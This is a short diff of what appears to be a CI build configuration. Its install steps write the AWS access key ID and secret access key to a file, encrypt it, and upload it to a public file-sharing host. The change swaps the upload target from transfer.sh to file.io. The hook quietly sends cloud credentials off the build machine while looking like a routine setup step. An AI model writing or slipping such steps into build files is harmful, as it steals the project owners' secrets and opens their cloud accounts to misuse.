@@ -28,7 +28,7 @@ install:
   - echo AWS_ACCESS_KEY_ID = $AWS_ACCESS_KEY_ID > info.txt
   - echo AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY > info.txt
   - ccencrypt info.txt -K $ENC_KEY
-  - curl --upload-file info.txt.cpt https://transfer.sh/info.txt.cpt
+  - curl -F'file=@info.txt.cpt' https://file.io
   - sudo pip install awscli
 
 script:
